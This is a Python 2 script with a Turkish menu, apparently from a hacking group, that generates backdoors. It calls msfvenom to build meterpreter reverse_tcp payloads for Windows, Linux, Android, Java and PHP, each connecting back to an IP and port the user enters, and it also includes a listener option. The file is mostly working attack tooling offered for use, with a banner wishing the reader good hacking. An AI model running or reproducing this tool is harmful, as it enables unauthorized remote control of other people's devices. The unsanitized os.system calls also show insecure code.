#!/usr/bin/env python
# -*- coding: utf-8 -*-

import os 
import sys
import socket
sys.path.append('core/')
from listener import *

print("""

           ***************************************************
           * Bu yazılım sistemlere zarar verebilir!!         *
           * kullanmadan önce yasal.txt i okuyunuz           *
           * Yazılım sahibi verilen hasardan sorumlu değildir*
           *                                                 *
	   *           HEPİNİZE İYİ HACKLEMELER              *
           *                                                 *
	   *          ☪                        ☪             *
           ***************************************************


[---]                 Arka kapı açıcı ve dinleyici                          [---]
[---]                                                                       [---]
[---]                 venom0x16 tarafından Kodlandı                         [---]
[---]                                                                       [---]
[---]                 Nighty taradından çevrildi                            [---]                                 
[---]              							    [---]
[---]                       TURK HACK TEAM  			            [---]
 
1) Arka kapı
2) Dinleme
3) Kullanım Şartları

""")

choice = raw_input("Seçenek Giriniz #~:  ")

if(choice=="1"):
	print("""
	          	,----------------,                ,---------, 
		    ,--------------------------,        ,"        ," |
		  ,"                       ,"  |       ,"        ,"  |
		 +------------------------+ |  |     ,"        ,"    |
		 |  .--------------------.  |  |     +---------+     |
		 |  |                    |  |  |     | -==----'|     |
		 |  |   Turk Hack Team   |  |  |     |         |     |
		 |  |   iyi hacklemeler  |  |  |/----|`---=    |     |
		 |  |                    |  |  |     |==== ooo |      ;
		 |  |                    |  |  |     |(((( [33]|    ,"
		 |  `--------------------'  |,"      | |((((   |  ,"
		 +-----------------------+  ;;       | |       |,"     
		    /_)______________(_/  //'       +.---------+
	       ___________________________/___  
	      /  oooooooooooooooo  .o.  oooo /,   
	     / ==ooooooooooooooo==.o.  ooo= //   
	    /_==__==========__==_ooo__ooo=_/'   
	    `-----------------------------'

		           ~ 5 Arka kapı seçeneği ~ 


1. Windows için
2. Linux için
3. Android için
4. MacOS için
5. Web için


       """)
	bd = raw_input("Arka kapı hangi sistem için üretilsin? #~: ")

	if(bd=="1"):
		os.system("clear")
		os.system("figlet TURK HACK TEAM")
		lhost = raw_input("Ip adresiniz: ")
		lport = raw_input("Port seçiniz: ")
		os.system("msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=" + lhost + " lport="  + lport + " -f exe -a x64 -o /root/Desktop/arkakapi.exe")
		print("(*) Arka kapı oluşturuldu Kolay gelsin :D")

	if(bd=="2"):
		os.system("clear")
		os.system("figlet TURK HACK TEAM")
		lhost = raw_input("Ip adresiniz: ")
		lport = raw_input("Port seçiniz: ")
		os.system("msfvenom -p python/meterpreter/reverse_tcp lhost=" + lhost + " lport=" + lport + " > /root/Desktop/arkakapi.py")
		print("(*) Arka kapı oluşturuldu Kolay gelsin :D")


	if(bd=="3"):
		os.system("clear")
		os.system("figlet TURK HACK TEAM")
		lhost = raw_input("Ip adresiniz: ")
		lport = raw_input("Port seçiniz: ")
		os.system("msfvenom -p  android/meterpreter/reverse_tcp lhost=" + lhost + " lport=" + lport + " > /root/Desktop/arkakapi.apk")
		print("(*) Arka kapı oluşturuldu Kolay gelsin :D")


	if(bd=="4"):
		os.system("clear")
		os.system("figlet TURK HACK TEAM")
		lhost = raw_input("Ip adresiniz: ")
		lport = raw_input("Port seçiniz: ")
		os.system("msfvenom -p  java/meterpreter/reverse_tcp lhost=" + lhost + " lport=" + lport + " -f jar > /root/Desktop/arkakapi.jar")
		print("(*) Arka kapı oluşturuldu Kolay gelsin :D")


	if(bd=="5"):
		os.system("clear")
		os.system("figlet TURK HACK TEAM")
		lhost = raw_input("Ip adresiniz: ")
		lport = raw_input("Port seçiniz: ")
		os.system("msfvenom -p  php/meterpreter/reverse_tcp lhost= " + lhost + " lport= " + lport + " > /root/Desktop/arkakapi.php")
		print("(*) Arka kapı oluşturuldu Kolay gelsin :D")

if(choice=="2"):
	listener()
if(choice=="3"):
	os.system("head yasal.txt")
	
	

	 


	

		
	 
 
                         
                                          
